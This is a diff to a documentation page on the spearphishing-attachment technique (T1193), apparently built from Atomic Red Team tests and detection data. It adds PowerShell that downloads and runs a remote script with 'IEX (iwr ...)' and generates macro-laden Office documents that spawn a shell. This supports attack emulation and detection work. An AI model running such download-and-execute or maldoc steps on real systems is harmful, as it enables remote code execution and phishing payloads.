@@ -9,14 +9,20 @@
 
 There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.
 
+## Aliases
+
+```
+
+```
+
 ## Additional Attributes
 
 * Bypass: None
 * Effective Permissions: None
-* Network: intentionally left blank
+* Network: None
 * Permissions: None
 * Platforms: ['Windows', 'macOS', 'Linux']
-* Remote: intentionally left blank
+* Remote: None
 * Type: attack-pattern
 * Wiki: https://attack.mitre.org/techniques/T1193
 
@@ -35,6 +41,18 @@ else{
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
   ($wc.DownloadString("$url")) | Out-File $fileName
 }
+
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
+Invoke-MalDoc $macrocode "16.0" "#{ms_product}"
+
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
+Invoke-MalDoc $macrocode "#{ms_office_version}" "Word"
+
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+$macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
+Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
 
 ```
 
@@ -56,6 +74,31 @@ else{
              '[Net.SecurityProtocolType]::Tls12\n'
              '  ($wc.DownloadString("$url")) | Out-File $fileName\n'
              '}\n',
+  'name': None,
+  'source': 'atomics/T1193/T1193.yaml'},
+ {'command': 'IEX (iwr '
+             '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")\n'
+             '$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write '
+             '#1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping '
+             '8.8.8.8`"`n"\n'
+             'Invoke-MalDoc $macrocode "16.0" "#{ms_product}"\n',
+  'name': None,
+  'source': 'atomics/T1193/T1193.yaml'},
+ {'command': 'IEX (iwr '
+             '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")\n'
+             '$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write '
+             '#1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping '
+             '8.8.8.8`"`n"\n'
+             'Invoke-MalDoc $macrocode "#{ms_office_version}" "Word"\n',
+  'name': None,
+  'source': 'atomics/T1193/T1193.yaml'},
+ {'command': 'IEX (iwr '
+             '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")\n'
+             '$macrocode = "   Open `"C:\\Users\\Public\\art.jse`" For Output '
+             'As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ '
+             '`"ping 8.8.8.8`"`n"\n'
+             'Invoke-MalDoc $macrocode "#{ms_office_version}" '
+             '"#{ms_product}"\n',
   'name': None,
   'source': 'atomics/T1193/T1193.yaml'}]
 ```
@@ -133,7 +176,21 @@ else{
                                 'product': 'windows'},
                   'status': 'experimental',
                   'tags': ['attack.initial_access', 'attack.t1193'],
-                  'title': 'Execution in Outlook Temp Folder'}}]
+                  'title': 'Execution in Outlook Temp Folder'}},
+ {'data_source': ['4688', 'Process Execution']},
+ {'data_source': ['4663', 'File monitoring']},
+ {'data_source': ['Packet capture']},
+ {'data_source': ['Mail server']},
+ {'data_source': ['Network intrusion detection system']},
+ {'data_source': ['Detonation chamber']},
+ {'data_source': ['Email gateway']},
+ {'data_source': ['4688', 'Process Execution']},
+ {'data_source': ['4663', 'File monitoring']},
+ {'data_source': ['Packet capture']},
+ {'data_source': ['Mail server']},
+ {'data_source': ['Network intrusion detection system']},
+ {'data_source': ['Detonation chamber']},
+ {'data_source': ['Email gateway']}]
 ```
 
 ## Potential Queries
@@ -145,7 +202,8 @@ else{
 ## Raw Dataset
 
 ```json
-[{'Atomic Red Team Test - Spearphishing Attachment': {'atomic_tests': [{'description': 'The '
+[{'Atomic Red Team Test - Spearphishing Attachment': {'atomic_tests': [{'auto_generated_guid': '114ccff9-ae6d-4547-9ead-4cd69f687306',
+                                                                        'description': 'The '
                                                                                        'macro-enabled '
                                                                                        'Excel '
                                                                                        'file '
@@ -233,6 +291,166 @@ else{
                                                                                 'Attachment '
                                                                                 '- '
                                                                                 'VBScript',
+                                                                        'supported_platforms': ['windows']},
+                                                                       {'auto_generated_guid': 'cbb6799a-425c-4f83-9194-5447a909d67f',
+                                                                        'dependencies': [{'description': 'Test '
+                                                                                                         'Requires '
+                                                                                                         'MS '
+                                                                                                         'Office '
+                                                                                                         'to '
+                                                                                                         'be '
+                                                                                                         'installed '
+                                                                                                         'and '
+                                                                                                         'have '
+                                                                                                         'been '
+                                                                                                         'run '
+                                                                                                         'previously. '
+                                                                                                         'Run '
+                                                                                                         '-GetPrereqs '
+                                                                                                         'to '
+                                                                                                         'run '
+                                                                                                         'msword '
+                                                                                                         'and '
+                                                                                                         'build '
+                                                                                                         'dependent '
+                                                                                                         'registry '
+                                                                                                         'keys\n',
+                                                                                          'get_prereq_command': '$msword '
+                                                                                                                '= '
+                                                                                                                'New-Object '
+                                                                                                                '-ComObject '
+                                                                                                                'word.application\n'
+                                                                                                                'Stop-Process '
+                                                                                                                '-Name '
+                                                                                                                'WINWORD\n',
+                                                                                          'prereq_command': 'If '
+                                                                                                            '(Test-Path '
+                                                                                                            'HKCU:SOFTWARE\\Microsoft\\Office\\#{ms_office_version}) '
+                                                                                                            '{ '
+                                                                                                            'exit '
+                                                                                                            '0 '
+                                                                                                            '} '
+                                                                                                            'else '
+                                                                                                            '{ '
+                                                                                                            'exit '
+                                                                                                            '1 '
+                                                                                                            '}\n'}],
+                                                                        'dependency_executor_name': 'powershell',
+                                                                        'description': 'Word '
+                                                                                       'spawning '
+                                                                                       'a '
+                                                                                       'command '
+                                                                                       'prompt '
+                                                                                       'then '
+                                                                                       'running '
+                                                                                       'a '
+                                                                                       'command '
+                                                                                       'with '
+                                                                                       'an '
+                                                                                       'IP '
+                                                                                       'address '
+                                                                                       'in '
+                                                                                       'the '
+                                                                                       'command '
+                                                                                       'line '
+                                                                                       'is '
+                                                                                       'an '
+                                                                                       'indiciator '
+                                                                                       'of '
+                                                                                       'malicious '
+                                                                                       'activity.\n'
+                                                                                       'Upon '
+                                                                                       'execution, '
+                                                                                       'CMD '
+                                                                                       'will '
+                                                                                       'be '
+                                                                                       'lauchned '
+                                                                                       'and '
+                                                                                       'ping '
+                                                                                       '8.8.8.8\n',
+                                                                        'executor': {'cleanup_command': 'if '
+                                                                                                        '(Test-Path '
+                                                                                                        '#{jse_path}) '
+                                                                                                        '{ '
+                                                                                                        'Remove-Item '
+                                                                                                        '#{jse_path} '
+                                                                                                        '}\n'
+                                                                                                        'Remove-ItemProperty '
+                                                                                                        '-Path '
+                                                                                                        "'HKCU:\\Software\\Microsoft\\Office\\#{ms_office_version}\\#{ms_product}\\Security\\' "
+                                                                                                        '-Name '
+                                                                                                        "'AccessVBOM' "
+                                                                                                        '-ErrorAction '
+                                                                                                        'Ignore\n',
+                                                                                     'command': 'IEX '
+                                                                                                '(iwr '
+                                                                                                '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")\n'
+                                                                                                '$macrocode '
+                                                                                                '= '
+                                                                                                '"   '
+                                                                                                'Open '
+                                                                                                '`"#{jse_path}`" '
+                                                                                                'For '
+                                                                                                'Output '
+                                                                                                'As '
+                                                                                                '#1`n   '
+                                                                                                'Write '
+                                                                                                '#1, '
+                                                                                                '`"WScript.Quit`"`n   '
+                                                                                                'Close '
+                                                                                                '#1`n   '
+                                                                                                'Shell`$ '
+                                                                                                '`"ping '
+                                                                                                '8.8.8.8`"`n"\n'
+                                                                                                'Invoke-MalDoc '
+                                                                                                '$macrocode '
+                                                                                                '"#{ms_office_version}" '
+                                                                                                '"#{ms_product}"\n',
+                                                                                     'elevation_required': False,
+                                                                                     'name': 'powershell'},
+                                                                        'input_arguments': {'jse_path': {'default': 'C:\\Users\\Public\\art.jse',
+                                                                                                         'description': 'Path '
+                                                                                                                        'for '
+                                                                                                                        'the '
+                                                                                                                        'macro '
+                                                                                                                        'to '
+                                                                                                                        'write '
+                                                                                                                        'out '
+                                                                                                                        'the '
+                                                                                                                        '"malicious" '
+                                                                                                                        '.jse '
+                                                                                                                        'file\n',
+                                                                                                         'type': 'String'},
+                                                                                            'ms_office_version': {'default': '16.0',
+                                                                                                                  'description': 'Microsoft '
+                                                                                                                                 'Office '
+                                                                                                                                 'version '
+                                                                                                                                 'number '
+                                                                                                                                 'found '
+                                                                                                                                 'in '
+                                                                                                                                 '"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office"',
+                                                                                                                  'type': 'String'},
+                                                                                            'ms_product': {'default': 'Word',
+                                                                                                           'description': 'Maldoc '
+                                                                                                                          'application '
+                                                                                                                          'Word '
+                                                                                                                          'or '
+                                                                                                                          'Excel',
+                                                                                                           'type': 'String'}},
+                                                                        'name': 'Word '
+                                                                                'spawned '
+                                                                                'a '
+                                                                                'command '
+                                                                                'shell '
+                                                                                'and '
+                                                                                'used '
+                                                                                'an '
+                                                                                'IP '
+                                                                                'address '
+                                                                                'in '
+                                                                                'the '
+                                                                                'command '
+                                                                                'line',
                                                                         'supported_platforms': ['windows']}],
                                                       'attack_technique': 'T1193',
                                                       'display_name': 'Spearphishing '
